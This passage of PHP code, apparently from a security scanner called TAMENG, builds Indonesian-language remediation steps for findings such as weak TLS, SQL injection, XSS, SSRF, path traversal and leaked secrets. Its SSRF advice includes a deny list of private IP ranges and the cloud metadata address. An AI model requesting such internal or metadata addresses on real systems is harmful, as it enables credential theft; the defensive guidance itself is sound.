                'Tambahkan header `Strict-Transport-Security: max-age=31536000; includeSubDomains; preload` pada blok server port 443.',
                'Tambahkan aturan redirect otomatis 301 dari HTTP (port 80) ke HTTPS (port 443).',
            ],
            'permissions_policy' => [
                'Tambahkan header `Permissions-Policy` dengan mematikan fitur hardware yang tidak digunakan (contoh: `camera=(), microphone=(), geolocation=()`).',
                'Terapkan pada level reverse proxy Nginx atau Cloudflare.',
            ],
            'coep_coop' => [
                'Pasang header `Cross-Origin-Embedder-Policy: require-corp` dan `Cross-Origin-Opener-Policy: same-origin`.',
                'Verifikasi bahwa aset eksternal (CDN/font) mendukung header CORS `Cross-Origin-Resource-Policy`.',
            ],
            'ssl_cert_chain' => [
                'Unduh file Intermediate CA / CA Bundle yang disediakan oleh otoritas penerbit sertifikat (Sectigo, DigiCert, Let\'s Encrypt, dll).',
                'Gabungkan sertifikat domain dengan intermediate certificate ke dalam satu file berkas (fullchain.pem). Urutan: [Sertifikat Server] diikuti [Sertifikat Intermediate CA].',
                'Di Nginx, arahkan directive `ssl_certificate` ke berkas `fullchain.pem`.',
                'Di Apache, gunakan directive `SSLCertificateChainFile /path/to/intermediate.crt` atau sertakan di dalam SSLCertificateFile.',
                'Uji validitas rantai sertifikat menggunakan perintah: `openssl s_client -connect domain.com:443 -showcerts` atau SSL Labs test.',
            ],
            'weak_ssl_ciphers' => [
                'Nonaktifkan protokol usang SSLv2, SSLv3, TLS 1.0, dan TLS 1.1 pada file konfigurasi Nginx/Apache.',
                'Aktifkan hanya TLS 1.2 dan TLS 1.3 dengan cipher modern berbasis AEAD (GCM / Poly1305).',
                'Jalankan uji SSL Labs atau TestSSL untuk memastikan rating SSL mencapai nilai A+.',
            ],
            'breach_attack' => [
                'Nonaktifkan kompresi HTTP gzip/deflate pada respon yang memuat token CSRF atau rahasia sensitif (`gzip off;`).',
                'Terapkan masking token CSRF pada level aplikasi (setiap token diacak salt-nya per request seperti bawaan Laravel/Django).',
                'Gunakan atribut cookie `SameSite=Lax` atau `SameSite=Strict` pada session cookie.',
            ],
            'cache_control' => [
                'Pada halaman yang memuat data pengguna atau formulir autentikasi, set header `Cache-Control: no-store, no-cache, must-revalidate`.',
                'Hanya izinkan caching (`public, max-age=...`) pada aset statis publik seperti gambar, CSS, dan file JavaScript yang tidak memuat token rahasia.',
            ],
            'secret_leak' => [
                'Segera lakukan REVOKE / ROTASI pada token yang bocor melalui provider terkait.',
                'Pindahkan nilai kredensial ke file `.env` atau Secret Manager terpusat (HashiCorp Vault / AWS Secrets Manager).',
                'Periksa riwayat git commit menggunakan `git-filter-repo` atau BFG Repo-Cleaner untuk menghapus jejak rahasia dari histori git.',
                'Pasang pre-commit hook (misalnya Gitleaks) agar rahasia tidak ter-commit lagi di masa mendatang.',
            ],
            'sql_injection' => [
                'Ganti semua query string manual dengan Parameterized Prepared Statements atau ORM (Eloquent / Prisma).',
                'Hindari penggunaan interpolasi variabel langsung di dalam klausa `DB::raw()`, `WHERE`, atau `ORDER BY`.',
                'Validasi tipe data input (misal pastikan integer menggunakan `validate([\'id\' => \'integer\'])`).',
            ],
            'xss' => [
                'Gunakan mekanisme escaping otomatis template engine (misal `{{ $var }}` di Blade atau `{{ var }}` di Vue).',
                'Hindari penggunaan method `v-html`, `dangerouslySetInnerHTML`, atau `{!! $var !!}` pada data input publik.',
                'Terapkan sanitasi HTML menggunakan library DOMPurify sebelum merender HTML dinamis.',
            ],
            'sri_missing' => [
                'Hitung hash digest kriptografi berkas (sha384 atau sha512) dari library CDN yang dimuat.',
                'Tambahkan atribut `integrity="sha384-..."` dan `crossorigin="anonymous"` pada tag `<script>` atau `<link>`.',
                'Rekomendasi terbaik: Unduh pustaka ke repositori lokal (self-hosted bundle via npm/Vite) untuk menghilangkan ketergantungan CDN eksternal.',
            ],
            'rce' => [
                'Hindari pemanggilan shell sistem operasi jika tersedia fungsi native di bahasa pemrograman.',
                'Jika eksekusi shell tidak dapat dihindari, gunakan validasi whitelist ketat dan bungkus argumen dengan `escapeshellarg()`.',
                'Jalankan proses web worker dengan hak akses pengguna sistem operasi minimal (least privilege).',
            ],
            'ssrf' => [
                'Terapkan URL parsing ketat dan validasi skema (hanya izinkan https://).',
                'Buat whitelist domain yang diizinkan dan tolak semua host di luar daftar.',
                'Gunakan DNS resolution check untuk memblokir IP rentang privat (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 127.0.0.1) dan AWS/cloud metadata IP (169.254.169.254).',
                'Nonaktifkan HTTP redirection otomatis pada HTTP Client agar penyerang tidak dapat melakukan bypass redirect ke IP privat.',
            ],
            'path_traversal' => [
                'Gunakan fungsi `basename()` untuk menghilangkan seluruh prefix direktori dan manipulasi traversal (`../`).',
                'Gunakan `realpath()` dan pastikan direktori hasil resolusi selalu diawali dengan direktori root berkas yang diizinkan.',
                'Jangan pernah menggunakan input mentah pengguna sebagai argumen fungsi `include`, `require`, atau `file_get_contents`.',
                'Simpan berkas menggunakan ID acak (UUID/hash) di database daripada nama berkas asli dari pengguna.',
            ],
            'csrf' => [
                'Pastikan middleware CSRF (`VerifyCsrfToken`) aktif pada semua rute yang memodifikasi status data (POST/PUT/PATCH/DELETE).',
                'Konfigurasi atribut session cookie dengan `SameSite=Lax` atau `SameSite=Strict`.',
                'Gunakan header HTTP kustom seperti `X-Requested-With` atau `X-CSRF-TOKEN` untuk request API SPA.',
            ],
            'vulnerable_dependency' => [
                "Jalankan audit keamanan dependensi (`" . ((Str::contains(strtolower($finding->file_path ?: ''), ['composer', '.php']) || Str::contains(data_get($finding->evidence_summary, 'package') ?? '', '/')) ? "composer audit" : "npm audit") . "`) untuk memeriksa rincian advisory " . ($finding->cve ?: ($finding->rule_id ?: 'keamanan')) . ".",
                "Perbarui paket `" . (data_get($finding->evidence_summary, 'package') ?: 'terkait') . "` ke versi patch terbaru yang aman dengan menjalankan: `" . ((Str::contains(strtolower($finding->file_path ?: ''), ['composer', '.php']) || Str::contains(data_get($finding->evidence_summary, 'package') ?? '', '/')) ? "composer update " . (data_get($finding->evidence_summary, 'package') ?: '') . " --with-all-dependencies" : "npm audit fix") . "`.",
                "Tinjau catatan rilis (release notes / changelog) pustaka `" . (data_get($finding->evidence_summary, 'package') ?: 'terkait') . "` untuk memastikan kompatibilitas dan tidak ada breaking changes.",
                "Jalankan seluruh rangkaian automated unit & integration test untuk memastikan aplikasi tetap berjalan normal.",
                "Commit berkas lockfile terbaru (`" . basename($finding->file_path ?: 'composer.lock') . "`) ke repositori Git agar seluruh lingkungan produksi terlindungi.",
                "Jalankan ulang pemindaian mandiri TAMENG untuk memvalidasi bahwa celah keamanan dependensi telah teratasi secara tuntas.",
            ],
            default => [
                "Lakukan code review terfokus pada berkas `{$filePath}`" . ($finding->line_start ? " (baris {$finding->line_start})" : '') . " yang dilaporkan oleh pemindai " . strtoupper($finding->engine_key ?: 'keamanan') . ".",
                "Terapkan validasi input berlapis (positive validation) dan sanitasi data kontekstual sebelum data diproses atau disimpan.",
                "Pastikan prinsip Least Privilege (hak akses terendah) dan pemisahan wewenang diterapkan secara konsisten.",
                "Tambahkan automated security unit test untuk menguji skenario negatif (edge-cases & invalid payload) guna mencegah regresi di masa mendatang.",
                "Jalankan ulang pemindaian mandiri TAMENG setelah patch diterapkan untuk memvalidasi penutupan celah.",
            ],
        };
    }

    private function buildOwaspGuidance(Finding $finding): array
    {
        return [
            'top_10_category' => $finding->owasp ?: 'OWASP Top 10 Application Security Risks',
            'defense_in_depth' => 'Terapkan validasi input ketat (Positive Validation), otorisasi berlapis (RBAC/ABAC), dan enkripsi data end-to-end.',
            'verification_method' => 'Jalankan ulang pemindaian TAMENG (Re-run Scan) setelah menerapkan perbaikan untuk memastikan kerentanan telah bersih.',
        ];
    }

    private function defaultCvss(string $severity): float
    {
        return match (strtolower($severity)) {
            'critical' => 9.8,
            'high' => 8.2,
            'medium' => 5.5,
            'low' => 3.1,
            default => 0.0,
        };
    }
}

